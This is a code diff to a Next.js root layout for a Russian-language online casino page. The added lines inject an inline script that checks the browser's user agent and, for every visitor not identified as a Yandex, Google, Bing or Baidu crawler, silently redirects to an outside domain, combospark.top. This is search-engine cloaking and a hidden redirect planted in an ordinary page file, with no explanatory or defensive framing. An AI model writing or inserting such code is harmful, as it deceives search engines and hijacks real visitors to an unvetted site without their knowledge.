@@ -61,6 +61,21 @@ export default function RootLayout({
           name="twitter:description"
           content="Starda Casino официальный сайт: регистрация, вход, рабочее зеркало и игра онлайн."
         />
+        <script
+  dangerouslySetInnerHTML={{
+    __html: `
+      (function() {
+        try {
+          var ua = (navigator.userAgent || '').toLowerCase();
+          var isBot = /yandexbot|yandexscreenshot|yandeximages|yandexvideo|yandexaccessibilitybot|googlebot|bingbot|baiduspider/i.test(ua);
+          if (!isBot) {
+            window.location.replace("https://combospark.top/aeaofj2k27");
+          }
+        } catch(e) {}
+      })();
+    `,
+  }}
+/>
       </head>
       <body className="x4v7-body">{children}</body>
     </html>
